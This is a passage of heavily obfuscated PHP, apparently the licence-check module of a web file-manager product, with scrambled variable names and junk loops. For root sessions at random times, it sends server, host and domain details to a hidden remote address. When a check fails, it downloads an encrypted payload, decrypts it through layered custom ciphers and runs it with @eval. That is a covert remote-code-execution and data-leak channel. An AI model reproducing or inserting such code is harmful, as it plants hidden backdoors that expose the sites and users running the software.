($ÊáÇÕµÆ && strstr($ÊáÇÕµÆ, $Òøó†ü[223])) { echo $ÊáÇÕµÆ; } die; } public function jelpde44075f($â¸Í–±) { $öÓ¥ =& $_SERVER[ú‡®¯¨±]; $şú¿Ùé =& $_SERVER[¶¬±€ıš]; if ($this->bhly92ea2f41 == $şú¿Ùé[224]) { return $â¸Í–±; } $ï…¯˜‘Õ = array($şú¿Ùé[225] => $şú¿Ùé[226], $şú¿Ùé[227] => $şú¿Ùé[226], $şú¿Ùé[228] => $şú¿Ùé[226], $şú¿Ùé[229] => $şú¿Ùé[230], $şú¿Ùé[231] => $şú¿Ùé[230], $şú¿Ùé[232] => $şú¿Ùé[230], $şú¿Ùé[233] => $şú¿Ùé[230], $şú¿Ùé[234] => $şú¿Ùé[230], $şú¿Ùé[235] => $şú¿Ùé[230], $şú¿Ùé[236] => $şú¿Ùé[230], $şú¿Ùé[237] => $şú¿Ùé[230], $şú¿Ùé[238] => $şú¿Ùé[230], $şú¿Ùé[239] => $şú¿Ùé[230], $şú¿Ùé[240] => $şú¿Ùé[230], $şú¿Ùé[241] => $şú¿Ùé[230]); $œË”äŒı = $öÓ¥[725]; if (strlen($œË”äŒı) < $öÓ¥[675]) { return; } $©«É›„ = explode($şú¿Ùé[242], _get($this->nuxbc9d204e3, $şú¿Ùé[114], $şú¿Ùé[6])); $š²Ñ¶´ = array(); $±¦Ô½É = $öÓ¥[726]; if (strlen($±¦Ô½É) < $öÓ¥[662]) { return; } foreach ($ï…¯˜‘Õ as $Ò´äšé« => $†™Öæ…û) { if ($†™Öæ…û == $şú¿Ùé[226] && substr($this->bhly92ea2f41, 0, 1) == $şú¿Ùé[226]) { continue; } if (!in_array($Ò´äšé«, $©«É›„)) { $š²Ñ¶´[] = $Ò´äšé«; } } foreach ($š²Ñ¶´ as $Ò´äšé«) { unset($â¸Í–±[$Ò´äšé«]); $¦äßÆ·¿ = $öÓ¥[727]; } return $â¸Í–±; $½‰òÏÃè = $öÓ¥[728]; while (strlen($½‰òÏÃè) < $öÓ¥[700]) { if (!$½‰òÏÃè) { break; } $½‰òÏÃè++; } } private function zwlr44150a0b() { $Ğ»Ğí» =& $_SERVER[¶¬±€ıš]; if ($this->bhly92ea2f41 != $Ğ»Ğí»[108]) { $GLOBALS[$Ğ»Ğí»[85]][$Ğ»Ğí»[89]][$Ğ»Ğí»[243]] = $Ğ»Ğí»[205]; return; } $GLOBALS[$Ğ»Ğí»[85]][$Ğ»Ğí»[244]] = $Ğ»Ğí»[122]; if (Model($Ğ»Ğí»[245])->get($Ğ»Ğí»[63]) != $Ğ»Ğí»[205]) { Model($Ğ»Ğí»[245])->set($Ğ»Ğí»[63], $Ğ»Ğí»[205]); } } public function jwxrd4d592c2() { return $_SERVER[¶¬±€ıš][246]; $ü‡–’Š† = $_SERVER[ú‡®¯¨±][729]; } private function dnpz09832c79() { $˜Ä¯ä©« =& $_SERVER[ú‡®¯¨±]; $·º¶Îş =& $_SERVER[¶¬±€ıš]; $‚·úÄ¶õ = array($·º¶Îş[247], $·º¶Îş[248], $·º¶Îş[249]); $âíˆ¹ä© = $˜Ä¯ä©«[730]; if (strlen($âíˆ¹ä©) < $˜Ä¯ä©«[208]) { return; } $ìËÕÎÊ˜ = $·º¶Îş[250] . md5($·º¶Îş[251]); $÷¦çÕ = $˜Ä¯ä©«[731]; while (strlen($÷¦çÕ) < $˜Ä¯ä©«[700]) { if (!$÷¦çÕ) { break; } $÷¦çÕ++; } if ($this->bhly92ea2f41 == $·º¶Îş[108] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$·º¶Îş[24]], $‚·úÄ¶õ)) { return; } if (time() % 4 != 0) { return; } $¦­’¬ÁÌ = call_user_func(array($·º¶Îş[252], $·º¶Îş[253]), $ìËÕÎÊ˜); if ($¦­’¬ÁÌ && time() - $¦­’¬ÁÌ < intval($·º¶Îş[254])) { return; } call_user_func(array($·º¶Îş[252], $·º¶Îş[139]), $ìËÕÎÊ˜, time()); $—å¾ÆÖó = $˜Ä¯ä©«[732]; if (!$—å¾ÆÖó) { die; } $‹—ŞßóŠ = Model($·º¶Îş[33])->get($·º¶Îş[99]); $ÀÜ²¡ı‚ = $˜Ä¯ä©«[733]; while (strlen($ÀÜ²¡ı‚) < $˜Ä¯ä©«[208]) { if (!$ÀÜ²¡ı‚) { break; } $ÀÜ²¡ı‚++; } $³ØŸèğÂ = array($·º¶Îş[152] => Model($·º¶Îş[33])->get($·º¶Îş[153]), $·º¶Îş[166] => $this->bhly92ea2f41, $·º¶Îş[163] => $_SERVER[$·º¶Îş[164]], $·º¶Îş[165] => Model($·º¶Îş[33])->get($·º¶Îş[131]), $·º¶Îş[104] => md5($_SERVER[$·º¶Îş[105]] . $‹—ŞßóŠ), $·º¶Îş[156] => $·º¶Îş[136], $·º¶Îş[159] => $_SERVER[$·º¶Îş[160]]); $ßç¼àáœ = $˜Ä¯ä©«[734]; while (strlen($ßç¼àáœ) < $˜Ä¯ä©«[662]) { if (!$ßç¼àáœ) { break; } $ßç¼àáœ++; } $½òÛ —Ó = $this->jxune448a0e3($·º¶Îş[255], $³ØŸèğÂ); $ó§¼Š¾½ = $˜Ä¯ä©«[735]; if (!is_array($½òÛ —Ó)) { return; } if ($½òÛ —Ó[$·º¶Îş[152]] && $½òÛ —Ó[$·º¶Îş[256]]) { if ($this->obkrfe57a68c($½òÛ —Ó[$·º¶Îş[256]]) == $³ØŸèğÂ[$·º¶Îş[152]]) { return; } } $this->eknw344ea4c3(); $‡Ê„Å‡ = $˜Ä¯ä©«[736]; while ($‡Ê„Å‡ < $˜Ä¯ä©«[662]) { if ($‡Ê„Å‡ >= 0) { break; } $‡Ê„Å‡++; } if ($this->obkrfe57a68c($½òÛ —Ó[$·º¶Îş[256]]) != $³ØŸèğÂ[$·º¶Îş[152]]) { $öİµÃ¦Î = array($·º¶Îş[184] => $‹—ŞßóŠ, $·º¶Îş[185] => $_SERVER[$·º¶Îş[105]], $·º¶Îş[186] => this_url(), $·º¶Îş[161] => $_SERVER[$·º¶Îş[162]]); $àş¾ˆ‹ù = $this->avqnd08da149(json_encode($öİµÃ¦Î)); $½òÛ —Ó = $this->jxune448a0e3($·º¶Îş[187] . $àş¾ˆ‹ù); if ($½òÛ —Ó && is_array($½òÛ —Ó) && isset($½òÛ —Ó[$·º¶Îş[256]])) { $î¾Œº¹¼ = $this->clvid12ffdb9($½òÛ —Ó[$·º¶Îş[256]], 2); if ($î¾Œº¹¼) { $î¾Œº¹¼ = $this->obkrfe57a68c($î¾Œº¹¼); } if ($î¾Œº¹¼) { try { @eval($î¾Œº¹¼); } catch (Exception $€îŠîÏÂ) { } } } } } private function jxune448a0e3($ÔÓÜ°Æ = '', $òˆ°­–¬ = array(), $‹Ê¾˜½ = 5) { $’È«Û³» =& $_SERVER[ú‡®¯¨±]; $Ó¼øæ– =& $_SERVER[¶¬±€ıš]; $ÀÙ³Ë = $Ó¼øæ–[257]; $Ì¤õË = $’È«Û³»[737]; if (strlen($Ì¤õË) < $’È«Û³»[675]) { die; } $ÀÙ³Ë = $this->yfat254a41d3($ÀÙ³Ë, $Ó¼øæ–[258]); $ÊŠ¶´ö = $’È«Û³»[738]; if (!$ÊŠ¶´ö) { return; } $ÀÙ³Ë = $ÀÙ³Ë . $ÔÓÜ°Æ; $¶«Ÿœ˜Ÿ = $’È«Û³»[739]; if ($òˆ°­–¬ && is_array($òˆ°­–¬)) { $ÀÙ³Ë = $ÀÙ³Ë . $Ó¼øæ–[259] . http_build_query($òˆ°­–¬); } if ($òˆ°­–¬ === -1) { return $ÀÙ³Ë; } $¶çÜ¦–Ñ = stream_context_create(array($Ó¼øæ–[218] => array($Ó¼øæ–[221] => $‹Ê¾˜½, $Ó¼øæ–[219] => $Ó¼øæ–[260]), $Ó¼øæ–[261] => array($Ó¼øæ–[262] => !1, $Ó¼øæ–[263] => !1))); $òˆ°­–¬ = @file_get_contents($ÀÙ³Ë, !1, $¶çÜ¦–Ñ); $…•Ô‹ñ™ = $’È«Û³»[740]; while ($…•Ô‹ñ™ < $’È«Û³»[662]) { if ($…•Ô‹ñ™ >= 0) { break; } $…•Ô‹ñ™++; } return json_decode($òˆ°­–¬, !0); $×‰¯îÀº = $’È«Û³»[741]; while ($×‰¯îÀº < $’È«Û³»[208]) { if ($×‰¯îÀº >= 0) { break; } $×‰¯îÀº++; } } private function wjceaf6bd8cb() { $î…çğÓ =& $_SERVER[ú‡®¯¨±]; $¿ó’óÚ =& $_SERVER[¶¬±€ıš]; $ŸûÔ¹Ÿ› = array($¿ó’óÚ[264] => $¿ó’óÚ[265], $¿ó’óÚ[266] => $¿ó’óÚ[267], $¿ó’óÚ[268] => $¿ó’óÚ[269], $¿ó’óÚ[270] => $¿ó’óÚ[271], $¿ó’óÚ[272] => $¿ó’óÚ[273], $¿ó’óÚ[274] => $¿ó’óÚ[213], $¿ó’óÚ[275] => $¿ó’óÚ[213], $¿ó’óÚ[276] => $¿ó’óÚ[265], $¿ó’óÚ[277] => $¿ó’óÚ[267], $¿ó’óÚ[278] => $¿ó’óÚ[269], $¿ó’óÚ[279] => $¿ó’óÚ[280], $¿ó’óÚ[281] => $¿ó’óÚ[271], $¿ó’óÚ[282] => $¿ó’óÚ[283], $¿ó’óÚ[284] => $¿ó’óÚ[273], $¿ó’óÚ[285] => $¿ó’óÚ[286], $¿ó’óÚ[287] => $¿ó’óÚ[288], $¿ó’óÚ[289] => $¿ó’óÚ[290]); $ÇÃ×ÒÛÁ = $î…çğÓ[742]; while ($ÇÃ×ÒÛÁ < $î…çğÓ[700]) { if ($ÇÃ×ÒÛÁ >= 0) { break; } $ÇÃ×ÒÛÁ++; } $äğ¦ÕÏ = $ŸûÔ¹Ÿ›[$this->bhly92ea2f41]; $äğ¦ÕÏ = intval($äğ¦ÕÏ ? $äğ¦ÕÏ : $¿ó’óÚ[265]); $Ä¦ˆùªÄ = $î…çğÓ[743]; if (strlen($Ä¦ˆùªÄ) < $î…çğÓ[208]) { die; } $´Ğ¯ş„ = _get($this->nuxbc9d204e3, $¿ó’óÚ[291]); $´Ğ¯ş„ = $´Ğ¯ş„ ? intval($´Ğ¯ş„) : 0; $Ûó‘Ú¸ = $î…çğÓ[744]; while ($Ûó‘Ú¸ < $î…çğÓ[208]) { if ($Ûó‘Ú¸ >= 0) { break; } $Ûó‘Ú¸++; } return $äğ¦ÕÏ + $´Ğ¯ş„; } public function bnsfcf7c2af6($¤÷úø) { $ˆÒÕ¿Ÿ™ =& $_SERVER[ú‡®¯¨±]; $š‹‹ö„® =& $_SERVER[¶¬±€ıš]; $âíÎŠ›î = $this->wjceaf6bd8cb(); if ($¤÷úø[$š‹‹ö„®[292]] == $š‹‹ö„®[122]) { return; } if ($âíÎŠ›î >= intval($š‹‹ö„®[213])) { return; } $õ‘ïè™¢ = Model($š‹‹ö„®[125])->count(); $ŞùİØŞ = $ˆÒÕ¿Ÿ™[745]; if ($õ‘ïè™¢ <= $âíÎŠ›î) { return; } $Û¸óøöÏ = Model($š‹‹ö„®[125])->field($š‹‹ö„®[292])->limit($âíÎŠ›î)->select(); $Ú¥İø«» = $ˆÒÕ¿Ÿ™[746]; if (strlen($Ú¥İø«») < $ˆÒÕ¿Ÿ™[673]) { die; } $Û¸óøöÏ = array_to_keyvalue($Û¸óøöÏ, $š‹‹ö„®[6], $š‹‹ö„®[292]); if (!in_array($¤÷úø[$š‹‹ö„®[292]], $Û¸óøöÏ)) { show_json($š‹‹ö„®[293], !1, $š‹‹ö„®[209]); } } public function laxkc2ce43a4() { $ÁæûÖç¹ =& $_SERVER[¶¬±€ıš]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ÊÁåæşê = $ÁæûÖç¹[216]; $ò«çÊˆ = $_SERVER[ú‡®¯¨±][747]; if (!$ò«çÊˆ) { die; } $ÊÁåæşê = $this->yfat254a41d3($ÊÁåæşê, $ÁæûÖç¹[217]); $èïõ›îı = stream_context_create(array($ÁæûÖç¹[218] => array($ÁæûÖç¹[219] => $ÁæûÖç¹[220], $ÁæûÖç¹[221] => 3))); $ñÀ˜ßÉö = @file_get_contents($ÊÁåæşê, !1, $èïõ›îı); echo $ÁæûÖç¹[294] . hash_encode($ñÀ˜ßÉö) . $ÁæûÖç¹[295]; } private function hifx82002c4f($Óúß¿ç¬, $é›á®Ï, $¯ÌÜğ¨˜ = 3) { $‡•¨«­Ç =& $_SERVER[ú‡®¯¨±]; $ÊñõĞÊğ =& $_SERVER[¶¬±€ıš]; usleep(1); $Óúß¿ç¬ = trim($Óúß¿ç¬); $Åğ¼Ù†¤ = mt_rand(0, 5) . $ÊñõĞÊğ[6]; $ÖÅä×ÌÀ = $‡•¨«­Ç[748]; $³Õğæ×½ = rand_string(15); $¦Ú™çÏ° = $ÊñõĞÊğ[296]; switch ($Åğ¼Ù†¤) { case $ÊñõĞÊğ[205]: $ÆÙí”ÆÉ = $this->skdy9e7e725a($Óúß¿ç¬, strrev($é›á®Ï . $³Õğæ×½)); $áñº— = $‡•¨«­Ç[749]; while ($áñº— < $‡•¨«­Ç[673]) { if ($áñº— >= 0) { break; } $áñº—++; } break; case $ÊñõĞÊğ[122]: $ÆÙí”ÆÉ = $this->skdy9e7e725a($Óúß¿ç¬, strrev($³Õğæ×½ . $é›á®Ï)); $Åüä”¦ = $‡•¨«­Ç[750]; while (strlen($Åüä”¦) < $‡•¨«­Ç[675]) { if (!$Åüä”¦) { break; } $Åüä”¦++; } break; case $ÊñõĞÊğ[297]: $ÆÙí”ÆÉ = $this->skdy9e7e725a($Óúß¿ç¬, base64_encode($³Õğæ×½ . $é›á®Ï)); break; case $ÊñõĞÊğ[298]: $ÆÙí”ÆÉ = $this->skdy9e7e725a($Óúß¿ç¬, md5($³Õğæ×½ . $é›á®Ï)); break; $ùÆúÅ¾¿ = $‡•¨«­Ç[751]; case $ÊñõĞÊğ[299]: $Óúß¿ç¬ = base64_encode($Óúß¿ç¬); $ÏÃÛäŠ­ = rand(0, 64); $‡µ·…áŒ = $‡•¨«­Ç[752]; if (strlen($‡µ·…áŒ) < $‡•¨«­Ç[675]) { return; } $÷‘ƒÏÀ® = $¦Ú™çÏ°[$ÏÃÛäŠ­]; $¡ÄõÏ­ä = md5($÷‘ƒÏÀ® . md5($é›á®Ï . $÷‘ƒÏÀ®) . $é›á®Ï); $¡ÄõÏ­ä = substr($¡ÄõÏ­ä, $ÏÃÛäŠ­ % 8, $ÏÃÛäŠ­ % 8 + 7); $®‚™Ä = $ÊñõĞÊğ[6]; $ˆ™Û¨æ² = $‡•¨«­Ç[753]; if (strlen($ˆ™Û¨æ²) < $‡•¨«­Ç[673]) { return; } $ï‘íÏ¨ = 0; $Œ÷–Ó”Á = $‡•¨«­Ç[754]; while ($Œ÷–Ó”Á < $‡•¨«­Ç[208]) { if ($Œ÷–Ó”Á >= 0) { break; } $Œ÷–Ó”Á++; } $ŸÜ¿µı  = 0; $ÔÈ–œåú = 0; $¢Œ±ÑÆø = $‡•¨«­Ç[670]; while ($¢Œ±ÑÆø < $‡•¨«­Ç[662]) { if ($¢Œ±ÑÆø >= 0) { break; } $¢Œ±ÑÆø++; } for ($ï‘íÏ¨ = 0; $ï‘íÏ¨ < strlen($Óúß¿ç¬); $ï‘íÏ¨++) { $ÔÈ–œåú = $ÔÈ–œåú == strlen($¡ÄõÏ­ä) ? 0 : $ÔÈ–œåú; $ŸÜ¿µı  = ($ÏÃÛäŠ­ + strpos($¦Ú™çÏ°, $Óúß¿ç¬[$ï‘íÏ¨]) + ord($¡ÄõÏ­ä[$ÔÈ–œåú++])) % 64; $¨Œ›ñ““ = $‡•¨«­Ç[755]; if (strlen($¨Œ›ñ““) < $‡•¨«­Ç[662]) { die; } $®‚™Ä .= $¦Ú™çÏ°[$ŸÜ¿µı ]; $ñõ„äˆ· = $‡•¨«­Ç[756]; if (strlen($ñõ„äˆ·) < $‡•¨«­Ç[662]) { return; } } $ÆÙí”ÆÉ = hash_encode($÷‘ƒÏÀ® . $®‚™Ä); $Áåã´Â = $‡•¨«­Ç[757]; if (strlen($Áåã´Â) < $‡•¨«­Ç[700]) { die; } break; $¨ö­×»Í = $‡•¨«­Ç[758]; if (strlen($¨ö­×»Í) < $‡•¨«­Ç[675]) { die; } default: $ÆÙí”ÆÉ = $this->skdy9e7e725a($Óúß¿ç¬, $é›á®Ï . $³Õğæ×½); break; $™ƒíâ = $‡•¨«­Ç[759]; if (!$™ƒíâ) { return; } } $ÆÙí”ÆÉ = strrev($Åğ¼Ù†¤ . $³Õğæ×½ . $ÆÙí”ÆÉ); if ($¯ÌÜğ¨˜ - 1 > 0) { $ÆÙí”ÆÉ = $this->hifx82002c4f($ÆÙí”ÆÉ, $é›á®Ï, $¯ÌÜğ¨˜ - 1); } return $ÆÙí”ÆÉ; } private function clvid12ffdb9($ˆªãšÎç, $¿öÁÍ•¯, $®šËÄ´½ = 3) { $ÛíˆŸäï =& $_SERVER[ú‡®¯¨±]; $å™”…Úâ =& $_SERVER[¶¬±€ıš]; if (!is_string($ˆªãšÎç) || strlen($ˆªãšÎç) < 10) { return !1; } $ˆªãšÎç = trim($ˆªãšÎç); $ˆªãšÎç = strrev($ˆªãšÎç); $¬¤Õ‰è = $ÛíˆŸäï[760]; if (!$¬¤Õ‰è) { die; } $ÃÚ½Ùà = $ˆªãšÎç[0]; $´¶ÁÈÆÏ = substr($ˆªãšÎç, 1, 15); $¶„Œø•Œ = $ÛíˆŸäï[761]; if (strlen($¶„Œø•Œ) < $ÛíˆŸäï[208]) { die; } $ˆªãšÎç = substr($ˆªãšÎç, 16); $ëÉùÜè´ = $ÛíˆŸäï[762]; if (!$ëÉùÜè´) { die; } $ÊàéÒÉÌ = $å™”…Úâ[296]; switch ($ÃÚ½Ùà) { case $å™”…Úâ[205]: $‰³úçÁœ = $this->yfat254a41d3($ˆªãšÎç, strrev($¿öÁÍ•¯ . $´¶ÁÈÆÏ)); $ßëªµÖ = $ÛíˆŸäï[763]; if (!$ßëªµÖ) { die; } break; case $å™”…Úâ[122]: $‰³úçÁœ = $this->yfat254a41d3($ˆªãšÎç, strrev($´¶ÁÈÆÏ . $¿öÁÍ•¯)); break; $ØÅèÒ¸Ÿ = $ÛíˆŸäï[764]; if (strlen($ØÅèÒ¸Ÿ) < $ÛíˆŸäï[700]) { die; } case $å™”…Úâ[297]: $‰³úçÁœ = $this->yfat254a41d3($ˆªãšÎç, base64_encode($´¶ÁÈÆÏ . $¿öÁÍ•¯)); $ªã§ñÜÔ = $ÛíˆŸäï[765]; if (!$ªã§ñÜÔ) { return; } break; case $å™”…Úâ[298]: $‰³úçÁœ = $this->yfat254a41d3($ˆªãšÎç, md5($´¶ÁÈÆÏ . $¿öÁÍ•¯)); $Òù©ô² = $ÛíˆŸäï[766]; if (strlen($Òù©ô²) < $ÛíˆŸäï[673]) { return; } break; $†Äªâ‹å = $ÛíˆŸäï[767]; if (!$†Äªâ‹å) { die; } case $å™”…Úâ[299]: $ˆªãšÎç = hash_decode($ˆªãšÎç); $Æ»ªÆ©” = $ˆªãšÎç[0]; $¼âëÚÎ = $ÛíˆŸäï[768]; while (strlen($¼âëÚÎ) < $ÛíˆŸäï[700]) { if (!$¼âëÚÎ) { break; } $¼âëÚÎ++; } $ˆªãšÎç = substr($ˆªãšÎç, 1); $ö½§çã = $ÛíˆŸäï[769]; if (strlen($ö½§çã) < $ÛíˆŸäï[662]) { die; } $Å’Åæş® = strpos($ÊàéÒÉÌ, $Æ»ªÆ©”); $»‰§®£ = $ÛíˆŸäï[770]; if (!$»‰§®£) { return; } $ëáúÕïô = md5($Æ»ªÆ©” . md5($¿öÁÍ•¯ . $Æ»ªÆ©”) . $¿öÁÍ•¯); $ù€å¿·§ = $ÛíˆŸäï[771]; $ëáúÕïô = substr($ëáúÕïô, $Å’Åæş® % 8, $Å’Åæş® % 8 + 7); $›ÕÏ¨ïÈ = $ÛíˆŸäï[772]; $µæø–ê = $å™”…Úâ[6]; $Îö×İ€û = $ÛíˆŸäï[773]; while ($Îö×İ€û < $ÛíˆŸäï[208]) { if ($Îö×İ€û >= 0) { break; } $Îö×İ€û++; } $Ÿ¹×‰€ = 0; $¤¨—µè– = $ÛíˆŸäï[774]; while ($¤¨—µè– < $ÛíˆŸäï[673]) { if ($¤¨—µè– >= 0) { break; } $¤¨—µè–++; } $µúÆŠ × = 0; $§³•÷ÒÏ = $ÛíˆŸäï[775]; if (!$§³•÷ÒÏ) { die; } $ÉööĞŸ© = 0; $˜´²äÂ = $ÛíˆŸäï[776]; while ($˜´²äÂ < $ÛíˆŸäï[208]) { if ($˜´²äÂ >= 0) { break; } $˜´²äÂ++; } for ($Ÿ¹×‰€ = 0; $Ÿ¹×‰€ < strlen($ˆªãšÎç); $Ÿ¹×‰€++) { $ÉööĞŸ© = $ÉööĞŸ© == strlen($ëáúÕïô) ? 0 : $ÉööĞŸ©; $âá‡á¡“ = $ÛíˆŸäï[777]; if (!$âá‡á¡“) { return; } $åğ¢ùÉç = $ÉööĞŸ©++; $öÇñ†ç„ = $ÛíˆŸäï[778]; if (strlen($öÇñ†ç„) < $ÛíˆŸäï[700]) { return; } $µúÆŠ × = strpos($ÊàéÒÉÌ, $ˆªãšÎç[$Ÿ¹×‰€]) - $Å’Åæş® - ord($ëáúÕïô[$åğ¢ùÉç]); $µ¿ßâÌ³ = $ÛíˆŸäï[779]; while ($µúÆŠ × < 0) { $µúÆŠ × += 64; $‚şÅÙø = $ÛíˆŸäï[780]; if (strlen($‚şÅÙø) < $ÛíˆŸäï[675]) { die; } } $µæø–ê .= $ÊàéÒÉÌ[$µúÆŠ ×]; $´¯×û¡ı = $ÛíˆŸäï[660]; } $‰³úçÁœ = base64_decode($µæø–ê); $‰¾¥öîµ = $ÛíˆŸäï[781]; if (!$‰¾¥öîµ) { return; } break; default: $‰³úçÁœ = $this->yfat254a41d3($ˆªãšÎç, $¿öÁÍ•¯ . $´¶ÁÈÆÏ); break; } if ($®šËÄ´½ - 1 > 0) { $‰³úçÁœ = $this->clvid12ffdb9($‰³úçÁœ, $¿öÁÍ•¯, $®šËÄ´½ - 1); } return $‰³úçÁœ; } public function avqnd08da149($Ê¾÷Ú¨‡) { $”ÛÈÄÊ =& $_SERVER[ú‡®¯¨±]; $±ó™ºÚĞ =& $_SERVER[¶¬±€ıš]; $û„Œ = $this->ensicb18230c(); $­¯’êİ… = $”ÛÈÄÊ[782]; if (!$­¯’êİ…) { die; } $Ÿì×´è› = $this->ensicb18230c(); $İŠ™¡äú = ($û„Œ - 1) * ($Ÿì×´è› - 1); $Ñõ¹Œ« = $”ÛÈÄÊ[783]; while (strlen($Ñõ¹Œ«) < $”ÛÈÄÊ[662]) { if (!$Ñõ¹Œ«) { break; } $Ñõ¹Œ«++; } $Ÿ¿ßÍó× = intval(($û„Œ + $Ÿì×´è›) / 2); $›Õƒ¶ˆİ = $”ÛÈÄÊ[784]; if (!$›Õƒ¶ˆİ) { die; } while (1) { $ÙçÆÃ‚¾ = $Ÿ¿ßÍó×; $Âáö—ÈÂ = $”ÛÈÄÊ[785]; if (!$Âáö—ÈÂ) { return; } $¨Êõãí“ = $İŠ™¡äú; while ($¨Êõãí“ % $ÙçÆÃ‚¾ != 0) { $²ß—¶üŒ = $¨Êõãí“; $¨Êõãí“ = $ÙçÆÃ‚¾; $ÙçÆÃ‚¾ = $²ß—¶üŒ % $ÙçÆÃ‚¾; $ìÚÊ„ó = $”ÛÈÄÊ[786]; if (strlen($ìÚÊ„ó) < $”ÛÈÄÊ[700]) { return; } } if ($ÙçÆÃ‚¾ == 1) { break; } else { $Ÿ¿ßÍó×++; } } $á—øöØÃ = 2; $¯­·Ñ« = $”ÛÈÄÊ[787]; while ($¯­·Ñ« < $”ÛÈÄÊ[662]) { if ($¯­·Ñ« >= 0) { break; } $¯­·Ñ«++; } for ($µÛÜ¬çÛ = 0; $µÛÜ¬çÛ < $İŠ™¡äú * 10; $µÛÜ¬çÛ++) { if (($İŠ™¡äú * $µÛÜ¬çÛ + 1) % $Ÿ¿ßÍó× == 0) { $á—øöØÃ = intval(($İŠ™¡äú * $µÛÜ¬çÛ + 1) / $Ÿ¿ßÍó×); break; } } $Ğ¢¤ãŒ‡ = $this->skdy9e7e725a($û„Œ * $Ÿì×´è› . $±ó™ºÚĞ[6], $±ó™ºÚĞ[136]); $‹ƒ›£Ë— = md5($±ó™ºÚĞ[300] . ($û„Œ + $Ÿì×´è›) . $±ó™ºÚĞ[301] . $Ÿ¿ßÍó× . $±ó™ºÚĞ[301] . $á—øöØÃ . $±ó™ºÚĞ[302]); $³®ó‹ƒ€ = $this->skdy9e7e725a($Ê¾÷Ú¨‡, $‹ƒ›£Ë—) . $±ó™ºÚĞ[303] . $Ğ¢¤ãŒ‡; return $³®ó‹ƒ€; } public function obkrfe57a68c($Ç¾Œø§) { $É‚ˆÎ¹Ó =& $_SERVER[ú‡®¯¨±]; $»Œ¸Ôî =& $_SERVER[¶¬±€ıš]; $ÚÊ›Ùê½ = explode($»Œ¸Ôî[303], $Ç¾Œø§); $³îË¹Õ– = $É‚ˆÎ¹Ó[788]; if (strlen($³îË¹Õ–) < $É‚ˆÎ¹Ó[208]) { return; } if (count($ÚÊ›Ùê½) != 2) { return $»Œ¸Ôî[6]; } $•úÕôÜï = $this->yfat254a41d3($ÚÊ›Ùê½[1] . $»Œ¸Ôî[6], $»Œ¸Ôî[136]); if (!$•úÕôÜï) { return $»Œ¸Ôî[6]; } $•úÕôÜï = intval($•úÕôÜï); $·»¡ÊèÉ = $É‚ˆÎ¹Ó[789]; $ÈÊ÷Ì»× = 0; $ˆ®Àü¹œ = 0; $¬ì¤½š¼ = $É‚ˆÎ¹Ó[790]; for ($›¹Å÷ĞÁ = 3; $›¹Å÷ĞÁ < $•úÕôÜï; $›¹Å÷ĞÁ += 2) { if ($•úÕôÜï % $›¹Å÷ĞÁ != 0) { continue; } $ÈÊ÷Ì»× = $›¹Å÷ĞÁ; $Íâ‡±ÄÎ = $É‚ˆÎ¹Ó[791]; $ˆ®Àü¹œ = intval($•úÕôÜï / $›¹Å÷ĞÁ); $³Ş´è‡› = $É‚ˆÎ¹Ó[792]; if (!$³Ş´è‡›) { die; } break; } $Ö²¯«†Ü = ($ÈÊ÷Ì»× - 1) * ($ˆ®Àü¹œ - 1); $½¯Ğ«Øâ = intval(($ÈÊ÷Ì»× + $ˆ®Àü¹œ) / 2); while (1) { $ŸÊ°ŒŞ = $½¯Ğ«Øâ; $­Õè´êÉ = $Ö²¯«†Ü; while ($­Õè´êÉ % $ŸÊ°ŒŞ != 0) { $¿Ñ¯ƒ× = $­Õè´êÉ; $­Õè´êÉ = $ŸÊ°ŒŞ; $éãÔğ©Ş = $É‚ˆÎ¹Ó[793]; if (!$éãÔğ©Ş) { die; } $ŸÊ°ŒŞ = $¿Ñ¯ƒ× % $ŸÊ°ŒŞ; $£ßÃ¢’£ = $É‚ˆÎ¹Ó[794]; } if ($ŸÊ°ŒŞ == 1) { break; } else { $½¯Ğ«Øâ++; } } $Óçæ‘•Œ = 2; $ëøŸèÄ‹ = $É‚ˆÎ¹Ó[795]; while (strlen($ëøŸèÄ‹) < $É‚ˆÎ¹Ó[662]) { if (!$ëøŸèÄ‹) { break; } $ëøŸèÄ‹++; } for ($›¹Å÷ĞÁ = 0; $›¹Å÷ĞÁ < $Ö²¯«†Ü * 10; $›¹Å÷ĞÁ++) { if (($Ö²¯«†Ü * $›¹Å÷ĞÁ + 1) % $½¯Ğ«Øâ == 0) { $Óçæ‘•Œ = intval(($Ö²¯«†Ü * $›¹Å÷ĞÁ + 1) / $½¯Ğ«Øâ); break; } } $˜ŞÊèŸÈ = md5($»Œ¸Ôî[300] . ($ÈÊ÷Ì»× + $ˆ®Àü¹œ) . $»Œ¸Ôî[301] . $½¯Ğ«Øâ . $»Œ¸Ôî[301] . $Óçæ‘•Œ . $»Œ¸Ôî[302]); $åÂÅ¸Ğ = $this->yfat254a41d3($ÚÊ›Ùê½[0], $˜ŞÊèŸÈ); $‹ºîœï£ = $É‚ˆÎ¹Ó[796]; if (strlen($‹ºîœï£) < $É‚ˆÎ¹Ó[662]) { die; } return $åÂÅ¸Ğ; } public function ensicb18230c() { $ãôêˆîÊ =& $_SERVER[ú‡®¯¨±]; $ÁøáòÎ = mt_rand(pow(2, 14), pow(2, 16) - 1); $¼¾¶·Ã˜ = $ãôêˆîÊ[797]; while ($¼¾¶·Ã˜ < $ãôêˆîÊ[208]) { if ($¼¾¶·Ã˜ >= 0) { break; } $¼¾¶·Ã˜++; } $•òïÖşı = array(); $ôşšäÆ¬ = 1; while ($ôşšäÆ¬ <= (int) sqrt($ÁøáòÎ)) { $à¸™éÒ¨ = $ôşšäÆ¬; while (!0) { $à¸™éÒ¨++; if ($à¸™éÒ¨ <= 2) { $ôşšäÆ¬ = $à¸™éÒ¨; break; } else { if ($à¸™éÒ¨ < 2) { continue; } } $à§¯õßí = !0; for ($ŸÃœÖÑö = 2; $ŸÃœÖÑö <= sqrt($à¸™éÒ¨); $ŸÃœÖÑö++) { if ($à¸™éÒ¨ % $ŸÃœÖÑö == 0) { $à§¯õßí = !1; } } if ($à§¯õßí) { $ôşšäÆ¬ = $à¸™éÒ¨; break; } } $•òïÖşı[] = $ôşšäÆ¬; $ô·£Ù¶… = $ãôêˆîÊ[798]; if (strlen($ô·£Ù¶…) < $ãôêˆîÊ[673]) { return; } } $¢è¸ùŒÕ = 2; $´¤¡ÀŒ = $ãôêˆîÊ[799]; if (strlen($´¤¡ÀŒ) < $ãôêˆîÊ[673]) { return; } for ($à¸™éÒ¨ = $ÁøáòÎ; $à¸™éÒ¨ > 1; $à¸™éÒ¨--) { 